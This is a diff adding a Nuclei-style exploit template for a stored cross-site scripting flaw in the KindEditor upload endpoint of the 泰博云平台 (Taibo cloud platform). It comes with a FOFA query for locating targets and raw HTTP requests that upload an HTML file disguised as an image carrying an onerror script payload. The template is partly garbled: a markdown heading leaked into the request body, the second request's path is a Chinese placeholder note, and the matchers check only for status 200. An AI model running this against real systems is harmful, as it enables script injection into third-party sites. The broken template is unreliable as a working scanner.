@@ -1,0 +1,58 @@
+id: poc-pm3lcz1blga2ppag
+info:
+  name: 泰博云平台upload_json存在存储型xss漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pm3lcz1blga2ppag'
+  tags: file-upload,xss,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: pm3lcz1blga2ppag
+    fofa: title="泰博云平台"
+http:
+- raw:
+  - 'POST /resources/kindeditor/jsp/upload_json.jsp?dir=image HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.1704.30 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6X8r2a9k
+
+    Connection: keep-alive
+
+    ------WebKitFormBoundary6X8r2a9k
+
+    Content-Disposition: form-data; name="imgFile"; filename="test.jpg"
+
+    Content-Type: image/png
+
+
+    <h1>qwcw<h1>
+
+    <img src=test onerror=alert("渗透安全HackTwo")>
+
+    ------WebKitFormBoundary6X8r2a9k--
+
+
+    **2.GET 访问上传地址**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /这里填第一个响应里的url路径（去掉反斜杠） HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.1704.30 Safari/537.36
+
+    Accept: */*
+
+    Connection: keep-alive'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
